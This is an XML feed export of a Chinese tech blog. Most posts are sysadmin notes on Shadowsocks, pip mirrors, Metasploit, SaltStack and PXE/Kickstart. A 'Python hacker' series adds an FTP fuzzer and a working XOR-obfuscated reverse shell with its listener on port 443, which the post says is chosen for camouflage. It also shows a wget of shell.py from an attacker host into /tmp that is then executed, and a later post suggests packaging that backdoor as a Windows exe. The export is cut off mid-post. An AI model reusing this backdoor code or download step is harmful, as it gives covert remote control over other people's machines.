'Yggdroot/indentLine'Plugin 'Chiel92/vim-autoformat'filetype plugin indent on" hot keynoremap &lt;F3&gt; :Autoformat&lt;CR&gt; "自动缩进nnoremap &lt;silent&gt; &lt;F2&gt; :!clear;python %&lt;CR&gt; "调试python文件vim下F2运行当前文件]]></content>
      <categories>
        <category>Vim</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[ShadowSocks启动报错undefined symbol EVP_CIPHER_CTX_cleanup]]></title>
    <url>%2F2016%2F12%2F15%2Ferrornote-ss%2F</url>
    <content type="text"><![CDATA[解决openssl升级到1.1.0以上版本，导致shadowsocks2.8.2启动报undefined symbol: EVP_CIPHER_CTX_cleanup错误。 准备翻墙冲浪的时候Shadowsocks报错如下：12AttributeError: /usr/local/ssl/lib/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanupshadowsocks start failed 解决方法 ：1. vim打开文件openssl.pyvim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.py 路径不同根据报错路径而定 2. 修改libcrypto.EVP_CIPHER_CTX_cleanup.argtypes:%s/cleanup/reset/ :x 以上两条为VIM命令， 替换文中libcrypto.EVP_CIPHER_CTX_cleanup.argtypes 为libcrypto.EVP_CIPHER_CTX_reset.argtypes 共两处，并保存 3. 运行ShadowsocksOK 原因：这个问题是由于在openssl1.1.0版本中，废弃了EVP_CIPHER_CTX_cleanup函数，如官网中所说： EVP_CIPHER_CTX was made opaque in OpenSSL 1.1.0. As a result, EVP_CIPHER_CTX_reset() appeared and EVP_CIPHER_CTX_cleanup() disappeared. EVP_CIPHER_CTX_init() remains as an alias for EVP_CIPHER_CTX_reset(). EVP_CIPHER_CTX_reset函数替代了EVP_CIPHER_CTX_cleanup函数 EVP_CIPHER_CTX_reset函数说明： EVP_CIPHER_CTX_reset() clears all information from a cipher context and free up any allocated memory associate with it, except the ctx itself. This function should be called anytime ctx is to be reused for another EVP_CipherInit() / EVP_CipherUpdate() / EVP_CipherFinal() series of calls. EVP_CIPHER_CTX_cleanup函数说明： EVP_CIPHER_CTX_cleanup() clears all information from a cipher context and free up any allocated memory associate with it. It should be called after all operations using a cipher are complete so sensitive information does not remain in memory. 可以看出，二者功能基本上相同，都是释放内存，只是应该调用的时机稍有不同，所以用reset代替cleanup问题不大。 提示：openssl1.1.0目前兼容性很不好，大部分的软件都不支持目前支持的有nginx-1.11.5、curl-7.50.3不支持的有PHP-7.0.12、openssh-7.3p1所以如果决定使用openssl1.1.0需要考虑很多兼容问题，必须保留1.0.2或1.0.1(不推荐，存在一些已知漏洞，最重要的是如果服务器要开http2，由于新版chrome必须使用ALPN的限制，只有1.0.2版本支持ALPN，所以必须升级到1.0.2)版本以便编译其他程序。]]></content>
      <categories>
        <category>ErrorNote</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[更改pip源为国内阿里源]]></title>
    <url>%2F2016%2F12%2F15%2Flinux-pip%2F</url>
    <content type="text"><![CDATA[pip默认源为国外，so提高下载速度更换国内阿里源，及apt源、定制bash命令行提示符，废话不多直进主题 1. 创建配置文件1mkdir ~/.pip/ &amp;&amp; cd ~/.pip/; vim pip.conf 2. 添加阿里源添加如下内容 12345[global]index-url = http://mirrors.aliyun.com/pypi/simple/[install]trusted-host=mirrors.aliyun.com 3. 测试1234567891011root@kalivi[12:13].pip:# pip install --upgrade pipYou are using pip version 7.1.0, however version 9.0.1 is available.You should consider upgrading via the 'pip install --upgrade pip' command.Collecting pip Downloading http://mirrors.aliyun.com/pypi/packages/b6/ac/7015eb97dc749283ffdec1c3a88ddb8ae03b8fad0f0e611408f196358da3/pip-9.0.1-py2.py3-none-any.whl (1.3MB) 100% |████████████████████████████████| 1.3MB 5.0MB/s Installing collected packages: pip Found existing installation: pip 7.1.0 Uninstalling pip-7.1.0: Successfully uninstalled pip-7.1.0Successfully installed pip-9.0.1 附上kali rolling清华大学apt镜像源 deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contrib 定制bash命令行提示符123echo "PS1='\[\e[31m\]\u@\h\[\e[m\][\A]\[\e[34m\]\W:\[\e[34m\]\$\[\e[m\] '" &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrcroot@kalivi[12:23]~:#]]></content>
      <categories>
        <category>Linux</category>
        <category>pip</category>
      </categories>
      <tags>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RedHat6/CentOS6 安装Metasploit]]></title>
    <url>%2F2016%2F12%2F06%2Fkali-metasploit%2F</url>
    <content type="text"><![CDATA[本章记录在RedHat6/CentOS6上安装Metasploit，因为坑队友给了台Redhat6系统的云主机。只能自己搞起来了 1. Metasploitmsf这部分msfinstall脚本会自动来安装，所以需要配置的也比较少 下载官方提供的安装脚本，并执行 1curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall 静静等待它下载完。。。msfinstall脚本只会安装metasploit，不会安装postgresql 2. Postgresqlyum -y install postgresql postgresql-server 这里我使用的是epel源 rpm -ivh http://dl.fedoraproject.org/pub/epel/6Server/x86_64/epel-release-6-8.noarch.rpm yum clean all &amp;&amp; yum makecache 3. 配置Postgresql(1)添加数据库，用户初始化启动 : service postgresql initdb service postgresql start 1234567891011121314#切换到普通用户su - postgres#创建数据库和用户psqlpostgres=# create user "youruser" with password 'yourpasswd' nocreatedb;CREATE ROLEpostgres=# create database "msf4" with owner="youruser";CREATE DATABASEpostgres=# \q退出 (2)修改服务配置文件切换回root vim /var/lib/pgsql/data/postgresql.conf 在我的机器上是这个文件，有可能会不同，名字一样自行查找 1234567#共修改2处更改 #listen_addresses = 'localhost'为 listen_addresses = '127.0.0.1'更改 #password_encryption = on为 password_encryption = on vim /var/lib/pgsql/data/pg_hba.conf 123#文件末尾处更改 host all all 127.0.0.1/32 ident为 host all all 127.0.0.1/32 md5 (3)重启服务service postgresql restart psql -U youruser -h 127.0.0.1 -dmsf4 测试是否配置成功 4. 配置Metasploitvim /root/.msf4/database.yml 添加如下内容 123456789production: adapter: "postgresql" database: "msf4" username: "youruser" password: "yourpasswd" host: "127.0.0.1" port: 5432 pool: 5 timeout: 5 cp /root/.msf4/database.yml /var/lib/pgsql/.msf4/database.yml msf初始化数据库 su - postgres msfdb init 5. 运行msfmsfconsole 查看数据库连接状态 msf &gt; db_status [*] postgresql connected to msf4#表示连接成功 当使用search搜索模板会提示[!] Module database cache not built yet, using slow search意思是数据库没有建立缓存 msf &gt; db_rebuild_cache 这样就会在后台建立数据库缓存了，至此全部安装配置已完成。后面会写一写关于metasploit的应用。]]></content>
      <categories>
        <category>Sec</category>
        <category>metasploit</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Linux 自动化运维之SlatStack安装]]></title>
    <url>%2F2016%2F07%2F18%2Flinux-saltstack01%2F</url>
    <content type="text"><![CDATA[slatstack入门安装 saltstack基本原理： SaltStack采用 C/S模式，server端就是salt的master，client端就是minion，minion与master之间通过ZeroMQ消息队列通信，是一个同时对一组服务器进行远程执行命令和状态管理的工具。 minion上线后先与master端联系，把自己的pub key发过去，这时master端通过salt-key -L命令就会看到minion的key，接受该minion-key后，也就是master与minion已经互信 master可以发送任何指令让minion执行了，salt有很多可执行模块，比如说cmd模块，在安装minion的时候已经自带了，它们通常位于你的python库中，locate salt | grep /usr/可以看到salt自带的所有东西。 这些模块是python写成的文件，里面会有好多函数，如cmd.run，当我们执行salt &#39;*&#39; cmd.run &#39;uptime&#39;的时候，master下发任务匹配到的minion上去，minion执行模块函数，并返回结果。master监听4505和4506端口，4505对应的是ZMQ的PUB system，用来发送消息，4506对应的是REP system是来接受消息的。 具体步骤如下: Salt stack的Master与Minion之间通过ZeroMq进行消息传递，使用了ZeroMq的发布-订阅模式，连接方式包括tcp，ipc salt命令，将cmd.run ls命令从salt.client.LocalClient.cmd_cli发布到master，获取一个Jodid，根据jobid获取命令执行结果。 master接收到命令后，将要执行的命令发送给客户端minion。 minion从消息总线上接收到要处理的命令，交给minion._handle_aes处理 minion._handle_aes发起一个本地线程调用cmdmod执行ls命令。线程执行完ls后，调用minion._return_pub方法，将执行结果通过消息总线返回给master master接收到客户端返回的结果，调用master._handle_aes方法，将结果写的文件中 salt.client.LocalClient.cmd_cli通过轮询获取Job执行结果，将结果输出到终端。 下面让我们来使用它，才能更好的理解它的工作模式和原理 安装 CentOS6/Redhat6 1sudo yum install https://repo.saltstack.com/yum/redhat/salt-repo-latest-1.el6.noarch.rpm 1yum clean all 安装salt-minion, salt-master, 或者其它组件 123456sudo yum install salt-master #server端sudo yum install salt-minion #client端sudo yum install salt-sshsudo yum install salt-syndicsudo yum install salt-cloudsudo yum install salt-api 服务端 1sudo yum install salt-master 客户端 1sudo yum install salt-minion 配置 :服务端 vim /etc/salt/master#master消息发布端口 Default: 4505 publish_port: 4505 #工作线程数，应答和接受minion Default: 5 worker_threads: 100 #客户端与服务端通信的端口 Default: 4506 ret_port: 4506 # 自动接受所有客户端 auto_accept: True # 自动认证配置 autosign_file: /etc/salt/autosign.conf 客户端 vim /etc/salt/minion# master IP或域名 master: 10.0.0.1 # 客户端与服务端通信的端口。 Default: 4506 syndic_master_port: 4506 # 建议线上用ip显示或业务编号 id: test id minion的唯一标示。Default: hostname minion id：minion的唯一标示，默认为minion的hostname，如果id修改了，master 需要重新认证。（通过tcpdump做了个实验，修改minion id后，master上会新增一个id，但老id也还在，执行salt ‘‘ test.ping的时候，执行时间变长了，延迟时间约为14s，而且master会在发送命令后延迟10s再给每个已经执行成功的minion发送一个包并有minion有返回，如果没有老id存在不会发送，可以理解为mater在向每个minion寻求未连接的id的信息，minion的salt服务关闭也是这种情况，修改timeout值无效。） 测试命令 ：测试环境中关闭 iptbles！！ 1service iptables stop master端执行 12salt-key -L salt-key -A 查看到minion端ip表示成功 Accepted Keys:192.168.1.3Denied Keys:Unaccepted Keys:Rejected Keys: 1salt '*' test.ping 192.168.1.3: True Posted by : DY]]></content>
      <categories>
        <category>自动化运维</category>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>Saltstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Kickstart无人值守安装Linux]]></title>
    <url>%2F2016%2F05%2F12%2Flinux-kickstart%2F</url>
    <content type="text"><![CDATA[作为中小公司的运维，经常会遇到一些机械式的重复工作，例如：有时公司同时上线几十甚至上百台服务器，而且需要我们在短时间内完成系统安装。 OK让我们来一起kickstart吧 1. 简介理论性知识建议大概看下,先按照步骤做一遍知到大概思路,在仔细看会更好(个人建议) 1) 什么是PXE? PXE，全名Pre-boot Execution Environment，预启动执行环境；通过网络接口启动计算机，不依赖本地存储设备（如硬盘）或本地已安装的操作系统；由Intel和Systemsoft公司于1999年9月20日公布的技术；Client/Server的工作模式:PXE客户端会调用网际协议(IP)、用户数据报协议(UDP)、动态主机设定协议(DHCP)、小型文件传输协议(TFTP)等网络协议；PXE客户端(client)这个术语是指机器在PXE启动过程中的角色。一个PXE客户端可以是一台服务器、笔记本电脑或者其他装有PXE启动代码的机器（我们电脑的网卡）。 2) PXE工作过程 1. PXE Client向DHCP发送请求PXE Client从自己的PXE网卡启动，通过PXE BootROM(自启动芯片)会以UDP(简单用户数据报协议)发送一个广播请求，向本网络中的DHCP服务器索取IP。 2. DHCP服务器提供信息DHCP服务器收到客户端的请求，验证是否来至合法的PXE Client的请求，验证通过它将给客户端一个“提供”响应，这个“提供”响应中包含了为客户端分配的IP地址、pxelinux启动程序(TFTP)位置，以及配置文件所在位置。 3. PXE客户端请求下载启动文件客户端收到服务器的“回应”后，会回应一个帧，以请求传送启动所需文件。这些启动文件包括：pxelinux.0、pxelinux.cfg/default、vmlinuz、initrd.img等文件。 4. Boot Server响应客户端请求并传送文件当服务器收到客户端的请求后，他们之间之后将有更多的信息在客户端与服务器之间作应答, 用以决定启动参数。BootROM由TFTP通讯协议从Boot Server下载启动安装程序所必须的文件(pxelinux.0、pxelinux.cfg/default)。default文件下载完成后，会根据该文件中定义的引导顺序，启动Linux安装程序的引导内核。 5. 请求下载自动应答文件客户端通过pxelinux.cfg/default文件成功的引导Linux安装内核后，安装程序首先必须确定你通过什么安装介质来安装linux，如果是通过网络安装(NFS, FTP, HTTP)，则会在这个时候初始化网络，并定位安装源位置。接着会读取default文件中指定的自动应答文件ks.cfg所在位置，根据该位置请求下载该文件。 这里有个问题，在第2步和第5步初始化2次网络了，这是由于PXE获取的是安装用的内核以及安装程序等，而安装程序要获取的是安装系统所需的二进制包以及配置文件。因此PXE模块和安装程序是相对独立的，PXE的网络配置并不能传递给安装程序，从而进行两次获取IP地址过程，但IP地址在DHCP的租期内是一样的。 6. 客户端安装操作系统将ks.cfg文件下载回来后，通过该文件找到OS Server，并按照该文件的配置请求下载安装过程需要的软件包。OS Server和客户端建立连接后，将开始传输软件包，客户端将开始安装操作系统。安装完成后，将提示重新引导计算机。 2. 安装DHCP服务如果是用虚拟机测试需要关闭虚拟网卡DHCP功能 1) 安装包123456[root@CentOS6.5 ~]# yum -y install dhcp[root@CentOS6.5 ~]# rpm -ql dhcp |grep "dhcpd.conf"/etc/dhcp/dhcpd.conf # 查看配置文件位置/usr/share/doc/dhcp-4.1.1/dhcpd-conf-to-ldap/usr/share/doc/dhcp-4.1.1/dhcpd.conf.sample/usr/share/man/man5/dhcpd.conf.5.gz 2) 编辑配置文件[root@CentOS6.5 ~]# vim /etc/dhcp/dhcp.conf 123456789default-lease-time 14400;ddns-update-style none;next-server 192.168.1.52; #指定tftpd服务器ipfilename "pxelinux.0";subnet 192.168.1.0 netmask 255.255.255.0 &#123; #地址池 range 192.168.1.50 192.168.1.240; default-lease-time 14400; # 设置默认的IP租用期限 max-lease-time 172800;&#125; [root@CentOS6.5 ~]# vim /etc/sysconfig/dhcpd 1DHCPDARGS=eth1 # 指定监听网卡 [root@CentOS6.5 ~]# service dhcpd restart 3. 安装TFTP1) TFTP简介:TFTP（Trivial File Transfer Protocol,简单文件传输协议）是TCP/IP协议族中的一个用来在客户机与服务器之间进行简单文件传输的协议，提供不复杂、开销不大的文件传输服务。端口号为69。 2) TFTP安装配置1234567891011121314151617181920[root@CentOS6.5 ~]# yum -y install tftp-server[root@CentOS6.5 ~]# vim /etc/xinetd.d/tftpservice tftp&#123; socket_type = dgram protocol = udp wait = yes user = root server = /usr/sbin/in.tftpd server_args = -s /var/lib/tftpboot # 指定目录，保持默认，不用修改 disable = no # 由原来的yes改为no per_source = 11 cps = 100 2 flags = IPv4&#125;[root@CentOS6.5 ~]# /etc/init.d/xinetd restartStopping xinetd: [FAILED]Starting xinetd: [ OK ][root@CentOS6.5 ~]# netstat -tunlp|grep 69udp 0 0 0.0.0.0:69 0.0.0.0:* 1106/xinetd 4. 安装HTTP服务可以用Apache或Nginx提供HTTP服务。Python的命令web服务不行，会有报错。 12345678910111213[root@CentOS6.5 ~]# yum -y install httpd[root@CentOS6.5 ~]# sed -i "277i ServerName 127.0.0.1:80" /etc/httpd/conf/httpd.conf[root@CentOS6.5 ~]# /etc/init.d/httpd start[root@CentOS6.5 ~]# mkdir /var/www/html/CentOS-6.5[root@CentOS6.5 ~]# mount /dev/sr0 /var/www/html/CentOS-6.5/ #sr0测试虚拟机环境线上会不同mount: block device /dev/sr0 is write-protected, mounting read-only[root@CentOS6.5 ~]# df -hFilesystem Size Used Avail Use% Mounted on/dev/sda3 19G 2.4G 16G 14% /tmpfs 491M 16K 491M 1% /dev/shm/dev/sda1 190M 36M 145M 20% /boot/dev/sr0 3.7G 3.7G 0 100% /var/www/html/CentOS-6.5# 不管怎么弄，只要把安装光盘内容能通过web发布即可。因为是演示，如果复制镜像就有点浪费时间。但生产环境就一定要复制了，光盘读取速度有限。 浏览器访问测试配置是否成功http://IP/CentOS-6.5 5. 配置支持PXE的启动程序syslinux是一个功能强大的引导加载程序，而且兼容各种介质。SYSLINUX是一个小型的Linux操作系统，它的目的是简化首次安装Linux的时间，并建立修护或其它特殊用途的启动盘。如果没有找到pxelinux.0这个文件,可以安装一下。 12345678910[root@CentOS6.5 ~]# yum -y install syslinux[root@CentOS6.5 ~]# cp /usr/share/syslinux/pxelinux.0 /var/lib/tftpboot/# 复制启动菜单程序文件[root@CentOS6.5 ~]# cp -a /var/www/html/CentOS-6.5/isolinux/* /var/lib/tftpboot/[root@CentOS6.5 ~]# ls /var/lib/tftpboot/boot.cat grub.conf isolinux.bin memtest splash.jpg vesamenu.c32boot.msg initrd.img isolinux.cfg pxelinux.0 TRANS.TBL vmlinuz# 新建一个pxelinux.cfg目录，存放客户端的配置文件。[root@CentOS6.5 ~]# mkdir -p /var/lib/tftpboot/pxelinux.cfg[root@CentOS6.5 ~]# cp /var/www/html/CentOS-6.5/isolinux/isolinux.cfg /var/lib/tftpboot/pxelinux.cfg/default 6. 测试手动网络安装开启一个新的虚拟机内存给1GB,不出错误会看到光盘安装界面, 接下来就是创建ks.cfg了. 关闭测试虚拟机,继续 7. 创建ks.cfg文件 通常，我们在安装操作系统的过程中，需要大量的和服务器交互操作，为了减少这个交互过程，kickstart就诞生了。使用这种kickstart，只需事先定义好一个Kickstart自动应答配置文件ks.cfg（通常存放在安装服务器上），并让安装程序知道该配置文件的位置，在安装过程中安装程序就可以自己从该文件中读取安装配置，这样就避免了在安装过程中多次的人机交互，从而实现无人值守的自动化安装。 生成kickstart配置文件的三种方法： 方法1、 每安装好一台Centos机器，Centos安装程序都会创建一个kickstart配置文件，记录你的真实安装配置。如果你希望实现和某系统类似的安装，可以基于该系统的kickstart配置文件来生成你自己的kickstart配置文件。（生成的文件名字叫anaconda-ks.cfg位于/root/anaconda-ks.cfg） 方法2、Centos提供了一个图形化的kickstart配置工具。在任何一个安装好的Linux系统上运行该工具，就可以很容易地创建你自己的kickstart配置文件。kickstart配置工具命令为rsystem-config-kickstart,网上有很多用CentOS桌面版生成ks文件的文章，如果有现成的系统就没什么可说。但没有现成的，也没有必要去用桌面版，命令行也很简单。 方法3、阅读kickstart配置文件的手册。用任何一个文本编辑器都可以创建你自己的kickstart配置文件。 这里贴出我的ks.cfg,这个是CentOS6.8的,可以根据需求更改 这里是官方文档详解ks.cfg配置文件语句CentOS 123456789101112131415161718192021222324252627282930313233343536#platform=x86, AMD64, 或 Intel EM64T#version=DEVEL# Firewall configurationfirewall --enabled --http --ssh# Install OS instead of upgradeinstall# Use network installationurl --url="http://192.168.1.52/CentOS6.5"# Root passwordrootpw --iscrypted $1$xn3sYOAA$jOfmmjxxYA/IRjFm0BM5O0# System authorization informationauth --useshadow --passalgo=sha512# Use graphical installgraphical# System keyboardkeyboard us# System languagelang zh_CN# SELinux configurationselinux --enforcing# Do not configure the X Window Systemskipx# Installation logging levellogging --level=info# System timezonetimezone Africa/Libreville# System bootloader configurationbootloader --location=mbr# Partition clearing informationclearpart --all %packages@php%end 8. 整合Default配置文件实现无人值守vim /var/lib/tftpboot/pxelinux.cfg/default 1234567default ksprompt 0label ks kernel vmlinuz append initrd=initrd.img ks=http://192.168.1.52/ks_config/CentOS-6.5-ks.cfg # 告诉安装程序ks.cfg文件在哪里# append initrd=initrd.img ks=http://192.168.1.52/ks_config/CentOS-6.5-ks.cfg ksdevice=eth0# ksdevice=eth0代表当客户端有多块网卡的时候，要实现自动化需要设置从eth1安装，不指定的话，安装的时候系统会让你选择，那就不叫全自动化了 9. 打开系统电源,出去吃个饭,过会回来,系统就以经装好了关闭服务端的iptables,selinux 12service iptables stopsetenforce 0 其cobbler也可实现无人值守,属于工具]]></content>
      <categories>
        <category>自动化运维</category>
        <category>Tools</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python黑客之旅0x5]]></title>
    <url>%2F2015%2F10%2F17%2Fpythonhacker_0x5%2F</url>
    <content type="text"><![CDATA[使用PyInstaller生成可以执行程序这一章是教大家如何把自己的python脚本编译成windows下可执行文件，它可以让你的python脚本跨平台去运行，并且不需要去安装python解释器。首先我们需要下载依赖包,cygwin(或者其他的工具也可以，这里我们使用Pywin). Python转exe安装Linux: sudo apt-get install python2.7 build-essential python-dev zlib1g-dev upx Windows: http://www.activestate.com/activepython (fully packaged installer file) 安装 Pywin32, Setuptools, PyInstaller 安装完成之后下一步我们就运行python命令生成可执行文件: 1python pyinstaller.py --onefile &lt;scriptName&gt; 执行上面的命令之后，导入依赖文件并且生成一个新的文件，这个文件里面包含了三个文件&lt;scriptName&gt;.txt,&lt;scriptName&gt;.spec和&lt;scriptName&gt;.exe文件，其中.txt与.spec可以删除掉，而.exe的文件就是你需要的执行程序. 完整的封装执行程序Python脚本现在已经被编译成了windows PE文件，并且不需要Python解释器就能够在windows下面独立运行，这可以让你更轻松的把脚本迁移到windows上面而且不用担心依赖包缺失的问题. 一个简单的脚本: 12345#!/usr/bin/python import os os.system("echo Hello World!") 现在我们把上面这个脚本编译成为一个可以执行的文件: Windows 1234c:\PathToPython\python.exe pyinstaller.py --onefile helloWorld.py &gt; helloWorld.exeHello World! Linux 1pytnstaller --onefile helloworld.py 生成后的可执行文件在dist文件夹中 如果你想更详细的了解这个过程，可以参考BACK TO THE SOURCE CODE – Forward/Reverse Engineering Python Malware 把你的python脚本编译成一个可以在windows上面可以执行的可执行程序是很有用的，因为它不需要你安装python解释器还有依赖包 大家可以尝试一下0x3中的例子，把那个脚本编译成可执行程序。下一章]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python黑客之旅0x4]]></title>
    <url>%2F2015%2F10%2F16%2Fpythonhacker_0x4%2F</url>
    <content type="text"><![CDATA[编写Fuzz测试脚本 这一章将会演示教你如何写一个属于自己的Fuzz测试脚本，当我们进行exploit研究和开发的时候就可以使用脚本语言发送大量的测试数据给受害者机器，但是这个错误数据很容易引发应用程序崩溃掉。 而Python却不同，当程序崩溃之后，此时你的程序会暂时断开连接，随后会立即创建一个新的连接继续执行。 下面我们首先要解决的问题是应用程序如何处理用户输入的内容，因为在进行模糊测试的时候，我们会不定时的想到一些新的思路然后把数据发送给受害者机器上面来测试，这基本思路就是先与服务器建立连接,然后发送测试数据给服务器，通过while循环语句来判断是否成功，即使出现错误也会处理掉: 下面是我们的扫描器伪代码:1234567891011121314151617181920 #导入socket,sys模块，如果是web服务那么还需要导入httplib,urllib等模块 &lt;import modules&gt; #设置ip/端口#调用脚本: ./script.py &lt;RHOST&gt; &lt;RPORT&gt;RHOST = sys.argv[1]RPORT = sys.argv[2] #定义你的测试数据,并且设置测试数据范围值buffer = '\x41'*50 #使用循环来连接服务并且发送测试数据while True: try: # 发送测试数据 # 直到递增到50 buffer = buffer + '\x41'*50 except: print "Buffer Length: "+len(buffer) print "Can't connect to service...check debugger for potential crash" 上面这个脚本框架能够适用于各种服务，你可以根据你的服务(https,http,mysql,sshd)编写特定模糊测试脚本.下面我们演示一个基于USER命令的ftp服务器模糊测试脚本: 模糊测试脚本123456789101112131415161718192021222324252627282930#导入你将要使用的模块，这样你就不用去自己实现那些功能函数了import sys, socketfrom time import sleep #声明第一个变量target用来接收从命令端输入的第一个值target = sys.argv[1]#创建50个A的字符串 '\x41'buff = '\x41'*50 # 使用循环来递增至声明buff变量的长度50while True: #使用"try - except"处理错误与动作 try: # 连接这目标主机的ftp端口 21 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.settimeout(2) s.connect((target,21)) s.recv(1024) print "Sending buffer with length: "+str(len(buff)) #发送字符串:USER并且带有测试的用户名 s.send("USER "+buff+"\r\n") s.close() sleep(1) #使用循环来递增直至长度为50 buff = buff + '\x41'*50 except: # 如果连接服务器失败，我们就打印出下面的结果 print "[+] Crash occured with buffer length: "+str(len(buff)-50) sys.exit() 上面这段代码演示了一个基本的Fuzz测试脚本，但是值得注意的是执行上面的代码，提交\x41字符可能不会让你成功的拿下受害主机，但是你可以尝试组合一些其他的字符(用户词典).此外还有一个更加强大的Fuzz测试工具Spike和具体介绍与演示,它可以一次性的测试大量数据，并且能让你提高成功概率. 练习大家可以把上面的ftp测试换成http测试，这里提示:你可能需要使用httplib/urllib.下一章]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python黑客之旅0x3]]></title>
    <url>%2F2015%2F10%2F15%2Fpythonhacker_0x3%2F</url>
    <content type="text"><![CDATA[反向shell 参考阅读:什么是反向Shell 这篇教程将会教你使用Python编写一个反向shell，首先我们先演示使用Python如何利用web服务器的功能，把文件从另一台主机传送过来。我们假设你有一台傀儡主机，你现在想下载傀儡机上面的的文件。那么你就可以使用shell(或meterpreter)去访问这台傀儡机，你可以通过一行Python代码把傀儡机建立成为一个web服务器，然后下载傀儡机上面的文件. 创建一个python HTTP服务器可以直接使用python的内建函数”SimpleHTTPServer”来创建，你可以使用’-m’参数直接在命令行调用模块，创建的服务器默认是监听的8000端口，但是你可以指定端口，直接在’SimpleHTTPServer’后面跟一个端口参数: 12python -m SimpleHTTPServer 80Serving HTTP on 0.0.0.0 80 ... 我们假设你没有防火墙去阻止你的连接，那么你是可以请求到这服务器的数据。你可以在任何目录里面去启动Python HTTP服务器，这样你就能够通过浏览器或者是远程客户端来访问这个目录。这里有一个简单的例子告诉你使用wget工具去获取文件,但是有些时候就会经常发现你根本没有权限在当前目录写入文件并且初始化这个脚本，但是你可以改变脚本执行的目录，下面这个例子就演示了把脚本在/tmp目录下面执行： 1234567891011#使用-O参数，把文件保存在其他目录- /tmp/ 一般可写wget -O /tmp/shell.py http://&lt;attacker_ip&gt;/shell.py #修改权限chmod a+x /tmp/shell.py # 使用file命令检查文件是否正确file /tmp/shell.py #执行脚本/usr/bin/python /tmp/shell.py 客户端反向shell代码阅读下面的后门代码。编码时会使用到socket，subprocess和sys模块，选择subprocess模块原因，是因为它允许使用一个变量储存STDOUT输出的结果，之后可以在代码中的其他部分通过调用此变量访问保存的STDOUT数据。下面的代码中：所建立的连接会监听443端口。443端口经常用在https上，这里使用443端口可以起到混淆视听的作用: 1234567891011121314151617181920212223242526272829#!/usr/bin/python import socket,subprocess,sys RHOST = sys.argv[1]RPORT = 443s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.connect((RHOST, RPORT)) while True: # 从socket中接收XOR编码的数据 data = s.recv(1024) # XOR the data again with a '\x41' to get back to normal data en_data = bytearray(data) for i in range(len(en_data)): en_data[i] ^=0x41 # 执行解码命令，subprocess模块能够通过PIPE STDOUT/STDERR/STDIN把值赋值给一个变量 comm = subprocess.Popen(str(en_data), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) comm.wait() STDOUT, STDERR = comm.communicate() # 输出编码后的数据并且发送给指定的主机RHOST en_STDOUT = bytearray(STDOUT) for i in range(len(en_STDOUT)): en_STDOUT[i] ^=0x41 s.send(en_STDOUT)s.close() 上面的代码中有些概念已经在0x2介绍过了，但是除了之前的使用socket创建一个连接之外，我们通过subprocess模块执行了一个命令，subprocess模块非常的方便，它允许你通过STDOUT/STDERR命令直接把值赋值给一个变量，然后我们可以通过命令把输出的进行编码然后通过socket网络发送出去。 使用OXR的好处就是你能够很容易编码你要发送过去的数据，然后通过相同的密钥来解码返回的数据，最后解码后的数据可以以明文的形式去执行命令。 服务端监听shell代码现在为了利用好这个后门，我们需要一个监听脚本并且解码后端传输过来的数据，让我们通过明文很清晰的看清楚返回的数据。 下面我们将要设计一个监听器。来获取反向shell的数据，并且能够对于输入／输出的进行解码/编码，为了能够在终端上面能够很清晰的看出来，所以需要使用XOR编码: 1234567891011121314151617181920212223import socket s= socket.socket(socket.AF_INET, socket.SOCK_STREAM)s.bind(("0.0.0.0", 443))s.listen(2)print "Listening on port 443... "(client, (ip, port)) = s.accept()print " Received connection from : ", ipwhile True: command = raw_input('~$ ') encode = bytearray(command) for i in range(len(encode)): encode[i] ^=0x41 client.send(encode) en_data=client.recv(2048) decode = bytearray(en_data) for i in range(len(decode)): decode[i] ^=0x41 print decode client.close()s.close() 这章的例子非常有趣，对于学习信息安全的朋友都喜欢shell，大家可以对代码做点修改让这个脚本也能够在window上面也能够正常运行，最后大家可以使用base64来代替XOR进行编码与解码，这些练习让你你更加熟练的使用python.下一章]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Python黑客之旅0x2]]></title>
    <url>%2F2015%2F10%2F14%2Fpythonhacker_0x2%2F</url>
    <content type="text"><![CDATA[端口扫描这一章将会演示如何通过Python的网络连接来开发一个基础的端口扫描器,我们的设计思路是使用socket一遍又一遍的去连接ip与端口的组合的新值,为了方面我们能够快速的完成它，首先需要介绍一点新的概念,for循环: 12345678910111213141516171819202122232425262728&gt;&gt;&gt;&gt;&gt;&gt; for port in range(1000,1024):... print "[+] The port is: "+str(port)...[+] The port is: 1000[+] The port is: 1001[+] The port is: 1002[+] The port is: 1003[+] The port is: 1004[+] The port is: 1005[+] The port is: 1006[+] The port is: 1007[+] The port is: 1008[+] The port is: 1009[+] The port is: 1010[+] The port is: 1011[+] The port is: 1012[+] The port is: 1013[+] The port is: 1014[+] The port is: 1015[+] The port is: 1016[+] The port is: 1017[+] The port is: 1018[+] The port is: 1019[+] The port is: 1020[+] The port is: 1021[+] The port is: 1022[+] The port is: 1023 注意上面那段代码在循环体内的缩进，通常情况下是空两格或一个tab键，但这都没有关系，只要你的整个代码一直就可以了。我么所写的那个简短的端口扫描器的核心代码会写在上面代码中的输出块部分，然后建立一个socket连接。下面的代码就演示了如何使用内建的socket模块去建立一个socket连接： 12345678910&gt;&gt;&gt;&gt;&gt;&gt; import socket&gt;&gt;&gt;&gt;&gt;&gt; s = socket.socket()&gt;&gt;&gt; s.connect(('127.0.0.1s', 